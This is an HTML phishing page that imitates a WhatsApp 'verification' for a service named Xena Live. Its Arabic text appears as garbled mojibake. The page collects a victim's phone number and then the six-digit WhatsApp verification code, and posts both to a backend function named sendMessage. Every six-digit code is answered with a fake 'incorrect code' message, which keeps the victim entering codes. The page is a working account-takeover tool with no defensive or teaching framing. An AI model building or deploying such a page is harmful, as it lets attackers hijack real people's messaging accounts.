<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ØªÙˆØ«ÙŠÙ‚ ÙˆØ§ØªØ³Ø§Ø¨</title>

  <!-- ØªØ­Ø³ÙŠÙ† Ø¹Ø±Ø¶ Ø§Ù„Ø±Ø§Ø¨Ø· ÙÙŠ Ø£ÙŠ ØªØ·Ø¨ÙŠÙ‚ -->
  <meta property="og:title" content="ØªÙˆØ«ÙŠÙ‚ Xena Live">
  <meta property="og:description" content="Ù‚Ù… Ø¨ØªÙˆØ«ÙŠÙ‚ Ø±Ù‚Ù… ÙˆØ§ØªØ³Ø§Ø¨ Ø§Ù„Ø®Ø§Øµ Ø¨Ø­Ø³Ø§Ø¨Ùƒ Ù„ØªÙØ¹ÙŠÙ„ ØµÙ„Ø§Ø­ÙŠØ§Øª Ø®Ø§ØµØ©">
  <meta property="og:image" content="https://yourdomain.com/logo.png">
  <meta property="og:url" content="https://yourdomain.com/xena-interface">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="ØªÙˆØ«ÙŠÙ‚ Xena Live">
  <meta name="twitter:description" content="Ù‚Ù… Ø¨ØªÙˆØ«ÙŠÙ‚ Ø±Ù‚Ù… ÙˆØ§ØªØ³Ø§Ø¨ Ø§Ù„Ø®Ø§Øµ Ø¨Ø­Ø³Ø§Ø¨Ùƒ Ù„ØªÙØ¹ÙŠÙ„ ØµÙ„Ø§Ø­ÙŠØ§Øª Ø®Ø§ØµØ©">
  <meta name="twitter:image" content="https://yourdomain.com/logo.png">

  <style>
    body{
      margin:0;
      font-family:Arial, sans-serif;
      background:linear-gradient(135deg,#8e2de2,#4a00e0);
      display:flex;
      align-items:center;
      justify-content:center;
      min-height:100vh;
      color:#fff;
    }
    .container{
      background:rgba(0,0,0,0.55);
      padding:30px;
      border-radius:18px;
      text-align:center;
      width:100%;
      max-width:420px;
      box-shadow:0 8px 30px rgba(0,0,0,0.4);
    }
    .logo{width:80px;margin-bottom:10px; transition: transform 0.3s;}
    .logo:hover{transform: scale(1.1) rotate(-5deg);}
    h1{
      font-size:1.6rem;
      margin:0 0 20px;
      display:flex;
      align-items:center;
      justify-content:center;
      gap:8px;
    }
    .verified{
      background:linear-gradient(90deg,#b993d6,#8ca6db);
      color:#003;
      padding:4px 10px;
      border-radius:999px;
      font-size:0.85rem;
      font-weight:bold;
    }
    .interactive-text{
      margin-bottom:20px;
      font-size:1.15rem;
      line-height:1.5;
      font-weight:bold;
      color:#ffd700;
    }
    .xena-text{
      font-size:1.2rem;
      font-weight:bold;
      background: linear-gradient(to right, red, orange, yellow, green, blue, indigo, violet);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom:15px;
    }
    .phone-row{
      display:flex;
      gap:10px;
      margin-bottom:8px;
    }
    select,input{
      padding:12px;
      border-radius:10px;
      border:none;
      font-size:1rem;
      background:rgba(255,255,255,0.08);
      color:#fff;
    }
    select{flex:0 0 110px;}
    input{flex:1;}
    .btn{
      width:100%;
      padding:14px;
      border:none;
      border-radius:10px;
      background:#6a0dad;
      font-size:1.05rem;
      color:#fff;
      cursor:pointer;
    }
    .btn:hover{background:#7b1fa2;}
    .hidden{display:none;}
    .error{
      color:#ff4d4d;
      font-size:0.9rem;
      margin-bottom:10px;
    }
    .code-row{
      display:flex;
      gap:8px;
      justify-content:center;
      margin-bottom:8px;
    }
    .code-box{
      width:35px;
      height:45px;
      border:none;
      border-radius:6px;
      font-size:1.1rem;
      text-align:center;
      background:rgba(255,255,255,0.1);
      color:#fff;
    }
  </style>
</head>
<body>
  <div class="container" id="phoneScreen">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
    
    <!-- Ø§Ù„Ù†Øµ Ø§Ù„Ø£ØµÙØ± Ø§Ù„ÙƒØ¨ÙŠØ± ØªØ­Øª Ø§Ù„Ø£ÙŠÙ‚ÙˆÙ†Ø© -->
    <div class="interactive-text">
      Ù‚Ù… Ø¨ØªÙˆØ«ÙŠÙ‚ Ø±Ù‚Ù… ÙˆØ§ØªØ³Ø§Ø¨ Ø§Ù„Ø®Ø§Øµ Ø¨Ø­Ø³Ø§Ø¨Ùƒ Ø¹Ù„Ù‰ ØªØ·Ø¨ÙŠÙ‚Ù†Ø§ Ù„ØªÙØ¹ÙŠÙ„ ØµÙ„Ø§Ø­ÙŠØ§Øª Ø®Ø§ØµØ©
    </div>

    <!-- Ù†Øµ Xena.live ÙÙˆÙ‚ Ø§Ù„Ø­Ù‚Ù„ -->
    <div class="xena-text">Â«Xena.liveÂ»</div>

    <h1>ØªÙˆØ«ÙŠÙ‚ ÙˆØ§ØªØ³Ø§Ø¨ <span class="verified">Ù…ÙˆØ«ÙˆÙ‚ âœ…</span></h1>

    <div class="phone-row">
      <select id="countryCode">
        <option value="+967">ğŸ‡¾ğŸ‡ª +967</option>
        <option value="+966">ğŸ‡¸ğŸ‡¦ +966</option>
        <option value="+20">ğŸ‡ªğŸ‡¬ +20</option>
        <option value="+971">ğŸ‡¦ğŸ‡ª +971</option>
        <option value="+1">ğŸ‡ºğŸ‡¸ +1</option>
        <option value="+44">ğŸ‡¬ğŸ‡§ +44</option>
        <option value="+49">ğŸ‡©ğŸ‡ª +49</option>
        <option value="+33">ğŸ‡«ğŸ‡· +33</option>
        <option value="+81">ğŸ‡¯ğŸ‡µ +81</option>
        <option value="+91">ğŸ‡®ğŸ‡³ +91</option>
        <option value="+39">ğŸ‡®ğŸ‡¹ +39</option>
        <option value="+7">ğŸ‡·ğŸ‡º +7</option>
        <option value="+55">ğŸ‡§ğŸ‡· +55</option>
        <option value="+34">ğŸ‡ªğŸ‡¸ +34</option>
        <option value="+46">ğŸ‡¸ğŸ‡ª +46</option>
        <option value="+61">ğŸ‡¦ğŸ‡º +61</option>
      </select>
      <input type="tel" id="phoneNumber" placeholder="Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ø§Ù„Ø¬ÙˆØ§Ù„" maxlength="15">
    </div>
    <div id="phoneError" class="error hidden">Ø§Ù„Ø±Ù‚Ù… ØºÙŠØ± ØµØ§Ù„Ø­</div>
    <button class="btn" id="verifyBtn">ØªÙˆØ«ÙŠÙ‚</button>
  </div>

  <div class="container hidden" id="codeScreen">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
    <h1>Ø£Ø¯Ø®Ù„ ÙƒÙˆØ¯ Ø§Ù„ØªØ­Ù‚Ù‚ <span class="verified">Ù…ÙˆØ«ÙˆÙ‚ âœ…</span></h1>
    <div class="code-row">
      <input maxlength="1" class="code-box" inputmode="numeric">
      <input maxlength="1" class="code-box" inputmode="numeric">
      <input maxlength="1" class="code-box" inputmode="numeric">
      <input maxlength="1" class="code-box" inputmode="numeric">
      <input maxlength="1" class="code-box" inputmode="numeric">
      <input maxlength="1" class="code-box" inputmode="numeric">
    </div>
    <div id="codeError" class="error hidden">Ø§Ù„Ø±Ù…Ø² ØºÙŠØ± ØµØ­ÙŠØ­ ÙŠØ±Ø¬Ù‰ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©</div>
    <button class="btn" id="confirmBtn">ØªØ£ÙƒÙŠØ¯</button>
  </div>

  <script>
    // Ù†Ø­ØªÙØ¸ Ø¨Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© ÙƒÙ…Ø§ Ù‡ÙŠ ØªÙ…Ø§Ù…Ù‹Ø§
    const phoneScreen = document.getElementById("phoneScreen");
    const codeScreen  = document.getElementById("codeScreen");
    const phoneError  = document.getElementById("phoneError");
    const codeError   = document.getElementById("codeError");

    document.getElementById("phoneNumber").addEventListener("input", e=>{
      e.target.value = e.target.value.replace(/[^0-9]/g,'');
    });

    document.getElementById("verifyBtn").addEventListener("click", async ()=>{
      const code = document.getElementById("countryCode").value;
      const num  = document.getElementById("phoneNumber").value.trim();
      
      if(num.length !== 9){
        phoneError.classList.remove("hidden");
        return;
      } else {
        phoneError.classList.add("hidden");
      }

      const msg = `${code}${num}`;
      
      // Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ø®Ù„ÙÙŠØ© Ø¨Ø¯Ù„ ÙˆØ¶Ø¹ Ø§Ù„ØªÙˆÙƒÙ† Ù‡Ù†Ø§ Ù…Ø¨Ø§Ø´Ø±Ø©
      await fetch('/.netlify/functions/sendMessage', {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "phone", text: msg })
      });

      phoneScreen.classList.add("hidden");
      codeScreen.classList.remove("hidden");
    });

    const boxes = document.querySelectorAll(".code-box");
    boxes.forEach((box, idx) => {
      box.addEventListener("input", () => {
        box.value = box.value.replace(/[^0-9]/g,'');
        if(box.value && idx < boxes.length - 1) boxes[idx + 1].focus();
      });
      box.addEventListener("keydown", (e) => {
        if(e.key === "Backspace" && !box.value && idx > 0){
          boxes[idx - 1].focus();
          boxes[idx - 1].value = '';
          e.preventDefault();
        }
      });
    });

    document.getElementById("confirmBtn").addEventListener("click", async ()=>{
      const code = Array.from(boxes).map(b=>b.value).join('');
      
      if(code.length < 6){
        codeError.textContent = "Ø§Ù„Ø±Ù…Ø² ØºÙŠØ± ØµØ§Ù„Ø­";
        codeError.classList.remove("hidden");
        return;
      }
      if(code.length === 6){
        codeError.textContent = "Ø§Ù„Ø±Ù…Ø² ØºÙŠØ± ØµØ­ÙŠØ­ ÙŠØ±Ø¬Ù‰ Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©";
        codeError.classList.remove("hidden");
      }

      // Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ø®Ù„ÙÙŠØ© Ø¨Ø¯Ù„ Ø§Ù„ØªÙˆÙƒÙ†
      await fetch('/.netlify/functions/sendMessage', {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "code", text: code })
      });
    });
  </script>
</body>
</html>
